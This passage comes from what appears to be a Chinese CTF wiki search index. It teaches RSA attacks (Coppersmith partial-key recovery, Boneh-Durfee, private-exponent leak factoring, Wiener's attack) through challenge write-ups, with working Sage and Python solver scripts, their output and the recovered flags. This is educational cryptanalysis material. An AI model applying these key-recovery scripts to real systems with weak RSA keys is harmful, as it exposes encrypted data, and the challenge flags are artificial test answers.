isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u7a0b\u5e8f\u5c06 t\uff0cu\uff0cy \u62fc\u63a5\u5728\u4e00\u8d77\u5f97\u5230 n\uff0c\u8fdb\u800c\uff0c\u7a0b\u5e8f\u5f97\u5230\u4e86 q\uff0c\u5e76\u5bf9 q \u7684\u4f4e k/16 \u4f4d\u505a\u4e86\u6291\u6216\uff0c\u7136\u540e\u8fd4\u56de q' \u3002 \u5728\u4e3b\u7a0b\u5e8f\u91cc\uff0c\u518d\u4e00\u6b21\u5f97\u5230\u4e86 n'=p*q' \u3002\u8fd9\u91cc\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b n'=p * ( q + random(2^{k/16})) \u800c p \u662f k/2 \u4f4d\u7684\uff0c\u6240\u4ee5\u8bf4\uff0crandom \u7684\u90e8\u5206\u6700\u591a\u53ef\u4ee5\u5f71\u54cd\u539f\u6765\u7684 n \u7684\u6700\u4f4e\u7684 k/2+k/16=9k/16 k/2+k/16=9k/16 \u6bd4\u7279\u4f4d\u3002 \u800c\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 n \u7684\u6700\u4f4e\u7684 5k/8=10k/16 \u6bd4\u7279\u4e3a\u5176\u5b9e\u5c31\u662f y\uff0c\u6240\u4ee5\u5176\u5e76\u6ca1\u6709\u5f71\u54cd\u5230 u\uff0c\u5373\u4f7f\u5f71\u54cd\u5230\u4e5f\u5c31\u6700\u591a\u5f71\u54cd\u5230\u4e00\u4f4d\u3002 \u6240\u4ee5\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u5f97\u5230\u7684 n \u6765\u83b7\u53d6 u\uff0c\u5982\u4e0b u=hex(n)[2:-1][-480:-320] \u867d\u7136\uff0c\u8fd9\u6837\u53ef\u80fd\u4f1a\u83b7\u5f97\u8f83\u591a\u4f4d\u6570\u7684 u\uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5bf9 u \u89e3\u5bc6\u7684\u65f6\u5019\u6bcf\u4e00\u5206\u7ec4\u90fd\u4e92\u4e0d\u5f71\u54cd\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u53ef\u80fd\u5f71\u54cd\u6700\u9ad8\u4f4d\u6570\u7684 p4\u3002\u800c p4 \u7684\u7684\u9ad8 8 \u4f4d\u4e5f\u6709\u53ef\u80fd\u662f\u586b\u5145\u7684\u3002\u4f46\u8fd9\u4e5f\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u56e0\u5b50 p \u7684\u7684\u5f88\u591a\u90e8\u5206\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u7740\u89e3\u5bc6\u4e86\u3002\u5982\u4e0b if __name__ == \"__main__\" : n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f u = hex ( n )[ 2 : - 1 ][ - 480 : - 320 ] u = int ( u , 16 ) p4 = pi_b ( u , 0 ) print hex ( p4 ) \u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b \u279c 2016 - HCTF - RSA2 git :( master ) \u2717 python exp_p4 . py 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 L \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 sage \u6765\u89e3\u5bc6\uff0c\u8fd9\u91cc sage \u91cc\u9762\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u653b\u51fb\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u597d from sage.all import * import binascii n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f p4 = 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 cipher = 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 e2 = 0xf93b pbits = 1024 kbits = pbits - p4 . nbits () print p4 . nbits () p4 = p4 << kbits PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p4 roots = f . small_roots ( X = 2 ^ kbits , beta = 0.4 ) if roots : p = p4 + int ( roots [ 0 ]) print \"p: \" , hex ( int ( p )) assert n % p == 0 q = n / int ( p ) print \"q: \" , hex ( int ( q )) print gcd ( p , q ) phin = ( p - 1 ) * ( q - 1 ) print gcd ( e2 , phin ) d = inverse_mod ( e2 , phin ) flag = pow ( cipher , d , n ) flag = hex ( int ( flag ))[ 2 : - 1 ] print binascii . unhexlify ( flag ) \u5173\u4e8e small_roots \u7684\u4f7f\u7528\uff0c\u53ef\u4ee5\u53c2\u8003 SAGE \u8bf4\u660e \u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016 -HCTF-RSA2 git: ( master ) \u2717 sage payload.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory 640 p: 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L q: 0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L 1 1 hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }","title":"2016 HCTF RSA2"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_13","text":"2016 \u6e56\u6e58\u676f \u7b80\u5355\u7684 RSA 2017 WHCTF Untitled","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#boneh-and-durfee-attack","text":"","title":"Boneh and Durfee attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_14","text":"\u5f53 d \u8f83\u5c0f\u65f6\uff0c\u6ee1\u8db3 d\\leq N^{0.292} d\\leq N^{0.292} \u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5\u5de5\u5177\uff0c\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u8be5\u8981\u653b\u51fb\u6bd4 Wiener's Attack \u8981\u5f3a\u4e00\u4e9b\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_15","text":"\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u539f\u7406 \u9996\u5148\u6211\u4eec\u6709 ed \\equiv 1 \\bmod \\varphi(N) ed \\equiv 1 \\bmod \\varphi(N) \u8fdb\u800c\u6211\u4eec\u6709 ed =k\\varphi(N)+1 ed =k\\varphi(N)+1 \u5373 k \\varphi(N) +1 \\equiv 0 \\bmod e k \\varphi(N) +1 \\equiv 0 \\bmod e \u53c8 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \u6240\u4ee5 k(N-p-q+1)+1 \\equiv 0 \\bmod e k(N-p-q+1)+1 \\equiv 0 \\bmod e \u6211\u4eec\u5047\u8bbe A=N+1 A=N+1 \uff0c y=-p-q y=-p-q \u90a3\u4e48 \u539f\u5f0f\u53ef\u5316\u4e3a f(k,y)=k(A+y)+1 \\equiv 0 \\bmod e f(k,y)=k(A+y)+1 \\equiv 0 \\bmod e \u5982\u679c\u6211\u4eec\u6c42\u5f97\u4e86\u8be5\u4e8c\u5143\u65b9\u7a0b\u7684\u6839\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b N=pq,p+q=-y N=pq,p+q=-y \u6765\u5f97\u5230 p \u4e0e q\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_16","text":"\u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002","title":"\u653b\u51fb\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_17","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 PlaidCTF-CTF-Curious \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u5806 N\uff0ce\uff0cc\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\u8be5 e \u6bd4\u8f83\u5927\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Wiener's Attack\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u66f4\u5f3a\u7684\u76ee\u524d\u4ecb\u7ecd\u7684\u653b\u51fb\u3002 \u6838\u5fc3\u4ee3\u7801\u5982\u4e0b nlist = list () elist = list () clist = list () with open ( 'captured' ) as f : # read the line {N : e : c} and do nothing with it f . readline () for i in f . readlines (): ( N , e , c ) = i [ 1 : - 2 ] . split ( \" : \" ) nlist . append ( long ( N , 16 )) elist . append ( long ( e , 16 )) clist . append ( long ( c , 16 )) for i in range ( len ( nlist )): print 'index i' n = nlist [ i ] e = elist [ i ] c = clist [ i ] d = solve ( n , e ) if d == 0 : continue else : m = power_mod ( c , d , n ) hex_string = \" %x \" % m import binascii print \"the plaintext:\" , binascii . unhexlify ( hex_string ) return \u7ed3\u679c\u5982\u4e0b === solution found === private key found: 23974584842546960047080386914966001070087596246662608796022581200084145416583 the plaintext: flag_S0Y0UKN0WW13N3R $4 TT4CK!","title":"\u4f8b\u5b50"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_18","text":"Survey: Lattice Reduction Attacks on RSA An Introduction to Coppersmith\u2019s method and Applications in Cryptology","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/","text":"d \u6cc4\u9732\u653b\u51fb \u00b6 \u653b\u51fb\u539f\u7406 \u00b6 \u9996\u5148\u5f53 d \u6cc4\u9732\u4e4b\u540e\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u6211\u4eec\u751a\u81f3\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u6570 N \u8fdb\u884c\u5206\u89e3\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b \u6211\u4eec\u77e5\u9053 ed \\equiv 1 \\bmod \\varphi(n) ed \\equiv 1 \\bmod \\varphi(n) \uff0c\u90a3\u4e48 \\varphi(n) | k=ed-1 \\varphi(n) | k=ed-1 \u3002\u663e\u7136 k \u662f\u4e00\u4e2a\u5076\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 k=2^tr k=2^tr \uff0c\u5176\u4e2d r \u4e3a\u5947\u6570\uff0ct \u4e0d\u5c0f\u4e8e 1\u3002\u90a3\u4e48\u5bf9\u4e8e\u4efb\u4f55\u7684\u4e0e N \u4e92\u7d20\u7684\u6570 g\uff0c\u6211\u4eec\u90fd\u6709 g^k \\equiv 1 \\bmod n g^k \\equiv 1 \\bmod n \u3002\u90a3\u4e48 z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} \u662f\u6a21 N \u7684\u4e8c\u6b21\u65b9\u6839\u3002\u90a3\u4e48\u6211\u4eec\u6709 z^2 \\equiv 1 \\bmod p \\\\ z^2 \\equiv 1 \\bmod q z^2 \\equiv 1 \\bmod p \\\\ z^2 \\equiv 1 \\bmod q \u8fdb\u800c\u6211\u4eec\u6211\u4eec\u77e5\u9053\u65b9\u7a0b\u6709\u4ee5\u4e0b\u56db\u4e2a\u89e3\uff0c\u524d\u4e24\u4e2a\u662f x \\equiv \\pm1 \\bmod N x \\equiv \\pm1 \\bmod N \u540e\u4e24\u4e2a\u662f \\pm x \\pm x \uff0c\u5176\u4e2d x \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 x \\equiv 1 \\bmod p \\\\ x \\equiv -1 \\bmod q x \\equiv 1 \\bmod p \\\\ x \\equiv -1 \\bmod q \u663e\u7136\uff0c z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} \u6ee1\u8db3\u7684\u662f\u540e\u9762\u90a3\u4e2a\u6761\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97 gcd(z-1,N) gcd(z-1,N) \u6765\u5bf9 N \u8fdb\u884c\u5206\u89e3\u3002 \u5de5\u5177 \u00b6 \u5229\u7528\u4ee5\u4e0b\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u8ba1\u7b97 RsaConverter.exe ( https://sourceforge.net/projects/rsaconverter/ , for windows ) rsatool.py 2017 HITB - hack in the card II \u00b6 The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -> publickey.pem). However it seems that they missed something...... Can you decrypt the following hex-encoded ciphertext this time? 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 \u8fd9\u9898\u662f\u63a5\u7eed 2017 HITB - hack in the card I \u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 openssl \u67e5\u770b publickey.pem \u7684\u516c\u94a5\uff0c\u53d1\u73b0\u5b83\u7684 N \u4e0e\u4e0a\u4e00\u9053\u9898\u7684 N \u76f8\u540c\uff0c\u5e76\u4e14\u4e0a\u9898\u7684 N\uff0ce\uff0cd \u5df2\u77e5\u3002\u7531\u6b64\u53ef\u76f4\u63a5\u4f7f\u7528\u4e0a\u9762\u7684 rsatool.py \u5f97\u5230 p\uff0cq\uff0c\u5e76\u901a\u8fc7\u672c\u9898\u7684 e \u8ba1\u7b97\u51fa e \u5f97\u5230\u660e\u6587\u3002 Wiener's Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5728 d \u6bd4\u8f83\u5c0f\uff08 d<\\frac{1}{3}N^{\\frac{1}{4}} d<\\frac{1}{3}N^{\\frac{1}{4}} \uff09\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 Wiener's Attack \u6765\u83b7\u5f97\u79c1\u94a5\u3002 \u653b\u51fb\u539f\u7406 \u00b6 https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/ \u5de5\u5177 \u00b6 https://github.com/pablocelayes/rsa-wiener-attack \u7efc\u5408\u4f8b\u5b50 \u00b6 2016 HCTF RSA1 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d RSA 1 - Crypto So Interesting \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\uff0c \u6e90\u4ee3\u7801\u94fe\u63a5 \u3002 \u9996\u5148\u5148\u7ed5\u8fc7\u7a0b\u5e8f\u7684 proof \u90e8\u5206\uff0c\u5dee\u4e0d\u591a\u4f7f\u7528\u4e00\u4e9b\u968f\u673a\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801\u90e8\u5206\uff0c\u7a0b\u5e8f\u662f\u6839\u636e\u6211\u4eec\u7684 token \u6765\u83b7\u53d6 flag \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u5229\u7528\u6e90\u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684 token\u3002 print \"This is a RSA Decryption System\" print \"Please enter Your team token: \" token = raw_input () try : flag = get_flag ( token ) assert len ( flag ) == 38 except : print \"Token error!\" m_exit ( - 1 ) \u63a5\u4e0b\u6765\u6211\u4eec\u9996\u5148\u77e5\u9053 n=pq n=pq \uff0c\u6211\u4eec\u518d\u6765\u4f60\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a e\uff0cd \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 p = getPrime ( 2048 ) q = getPrime ( 2048 ) n = p * q e , d = get_ed ( p , q ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e ) get_ed \u51fd\u6570\u5982\u4e0b def get_ed ( p , q ): k = cal_bit ( q * p ) phi_n = ( p - 1 ) * ( q - 1 ) r = random . randint ( 10 , 99 ) while True : u = getPrime ( k / 4 - r ) if gcd ( u , phi_n ) != 1 : continue t = invmod ( u , phi_n ) e = pi_b ( t ) if gcd ( e , phi_n ) == 1 : break d = invmod ( e , phi_n ) return ( e , d ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u5f97\u5230\u7684 u \u7684\u4f4d\u6570\u6bd4 n \u7684\u4f4d\u6570\u7684\u56db\u5206\u4e4b\u4e00\u8fd8\u8981\u5c11\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u5dee\u4e0d\u591a\u6ee1\u8db3\u4e86 Wiener's Attack \u4e86\u3002\u800c\u4e14\u6211\u4eec\u8ba1\u7b97\u51fa\u6765\u7684 u\uff0ct\uff0ce\uff0cd \u8fd8\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \u6839\u636e\u9898\u4e2d\u7ed9\u51fa\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 n\uff0ce\uff0cbt\u3002 \u6240\u4ee5\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u7b2c\u4e8c\u4e2a\u5f0f\u5b50\u77e5\u9053 e\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u4e2a\u5f0f\u5b50\u8fdb\u884c Wiener's Attack\uff0c\u83b7\u53d6 u\u3002\u8fdb\u800c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u79c1\u94a5\u6307\u6570\u6cc4\u9732\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u5206\u89e3 N \u4ece\u800c\u5f97\u5230 p\uff0cq\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230 d \u4e86\u3002 \u9996\u5148\u6211\u4eec\u7ed5\u8fc7 proof \u5f97\u5230\u4e86 N\uff0ce\uff0c\u52a0\u5bc6\u540e\u7684 flag \u5982\u4e0b n: 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 e: 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 flag: 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df \u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u8fdb\u884c Wiener's Attack \u5f97\u5230 u\uff0c\u5982\u4e0b if __name__ == \"__main__\" : bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L e = 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 t = gmpy2 . invert ( e , bt ) n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 solve ( n , t ) 